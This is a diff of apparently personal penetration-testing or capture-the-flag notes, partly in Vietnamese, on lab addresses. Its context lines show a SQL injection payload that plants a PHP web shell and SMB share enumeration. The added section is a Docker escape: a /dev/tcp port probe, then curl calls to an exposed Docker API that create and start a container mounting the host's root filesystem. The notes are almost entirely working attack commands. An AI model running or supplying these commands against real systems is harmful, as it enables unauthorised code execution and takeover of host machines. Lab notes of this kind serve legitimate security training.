@@ -105,3 +105,51 @@ udugisan3rd' UNION ALL SELECT "<?php system($_GET['cmd']); ?>", NULL, NULL, NULL
 smbclient -N -L \\\\10.129.2.102\\
 smbclient -N -L \\\\10.129.2.102\\backups
 ```
+## Docker esc
+```
+for p in 2375 2376 2377; do
+  (timeout 0.3 bash -c "echo >/dev/tcp/192.168.65.7/$p" 2>/dev/null) && echo "OPEN: $p" || echo "CLOSED: $p"
+done
+```
+### Docker rest API port 2375
+```
+cat > payload.json << 'EOF'
+{
+  "Image": "alpine:latest",
+  "Cmd": ["sleep", "infinity"],
+  "HostConfig": {
+    "Binds": ["/:/mnt/host_root"]
+  },
+  "Tty": true,
+  "OpenStdin": true
+}
+EOF
+
+## Create container
+# 1. Bắn lệnh Create và trích xuất ID (giả sử dùng jq, hoặc copy tay ID trả về)
+curl -s -H "Content-Type: application/json" -d @payload.json http://192.168.65.7:2375/containers/create
+
+# Gán ID vừa nhận được vào biến
+cid="ĐIỀN_CONTAINER_ID_VÀO_ĐÂY"
+
+# 2. Bắn lệnh Start để container chính thức chạy ngầm
+curl -X POST http://192.168.65.7:2375/containers/$cid/start
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
